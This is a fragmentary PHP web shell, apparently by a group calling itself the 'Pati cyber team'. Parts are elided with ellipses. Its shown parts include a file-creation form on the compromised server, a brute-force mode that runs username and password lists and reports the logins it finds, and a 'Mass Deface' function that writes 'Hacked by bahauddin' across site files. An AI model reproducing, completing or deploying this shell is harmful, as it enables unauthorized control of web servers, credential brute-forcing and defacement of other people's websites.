...
<meta name='author' content='Bahauddin Family'>
<meta charset="UTF-8">
<style type="text/css">
		body {
		    background: #000000;
...
echo "<center><font color='white' siz='10px' face='Fredericka the Great'>[+] Bahauddin [+]</font></center><br/>";
...
<?php 
	...
	echo"<center>
    		<table>
	    		<tr>
	          		<td>
	          		  <form style='float:right;' method='POST'><input name='path' value=".$bahakganteng." type=hidden>
					  <input class=bordergaya type='submit' value='Create New File' >
					  <input class=bordergaya size='40' name='new_file' /></form>
			        </td>
	          		<td>
	          		  <form  style='float:left;' method='POST'><input name='path' value=".$bahakganteng." type=hidden>
...
/////// Cukup Sampai Disini ya Grabber :( ////////
		...
		elseif(isset($_GET['x']) && ($_GET['x'] == 'brute'))
			...
			if(isset($_POST['usernames']) && isset($_POST['passwords']))
			{
			    ...
			    echo "<hr><b>You Found <font color=red>$ok</font> By Bahauddin</b>";
...
function sabun_massal($path,$namafile,$isi_script) {
	...
	<tr>
	<td colspan='3'><textarea class='justborder' name='script' style='width: 500px; height: 200px;'>Hacked by bahauddin</textarea><br></td>
	</tr>
	<tr>
	<td colspan='3' align='center'><input class='justborder' type='submit' name='start' value='Mass Deface' style='width: 50%;'><br/></td>
			...
			<input class="justborder" type="text" name="password" size="25" value="Bahauddin"></td></tr></table>
		...
		elseif(isset($_GET['x']) && ($_GET['x'] == 'tentang'))
		{
				echo"<br><br>
					<center><b>
			<font face='Jolly Lodger' color='red' size='6px'>Bahauddin<font color='white'> Pati cyber team</font><br>
					<br>
